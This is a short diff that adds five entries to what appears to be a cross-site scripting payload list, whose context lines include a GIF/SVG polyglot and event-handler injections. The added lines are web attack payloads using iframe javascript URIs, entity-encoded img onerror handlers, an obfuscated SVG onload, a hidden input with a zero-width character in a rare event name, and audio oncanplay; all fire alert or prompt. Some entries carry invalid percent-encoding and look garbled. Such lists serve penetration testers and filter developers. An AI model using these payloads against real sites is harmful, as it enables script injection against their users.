@@ -117,3 +117,8 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <form onsubmit=alert(1)><input type=submit>
 <select onchange=alert(1)><option>1<option>2
 <menu id=x contextmenu=x onshow=alert(1)>right click me!
+<iframe src=javas(Jcript:alert(1)>
+1'"<S><A HRef=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt; Title=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt;>
+<Svg%K9OnLoad=%7Krompt%6K1%6K>
+<input type=hidden oncontentvisibilityautostatechange​=alert(1) style=content-visibility:auto>
+<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
